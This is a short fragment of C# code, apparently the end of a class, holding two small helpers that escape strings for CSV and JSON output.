    private static string CsvEscape(string s) => s.Contains(',', StringComparison.Ordinal) || s.Contains('"', StringComparison.Ordinal) || s.Contains('\n', StringComparison.Ordinal)
        ? "\"" + s.Replace("\"", "\"\"", StringComparison.Ordinal) + "\"" : s;

    private static string JsonStr(string? s)
    {
        if (s == null) return "null";
        return "\"" + s.Replace("\\", "\\\\", StringComparison.Ordinal).Replace("\"", "\\\"", StringComparison.Ordinal).Replace("\r", "\\r", StringComparison.Ordinal).Replace("\n", "\\n", StringComparison.Ordinal) + "\"";
    }
}
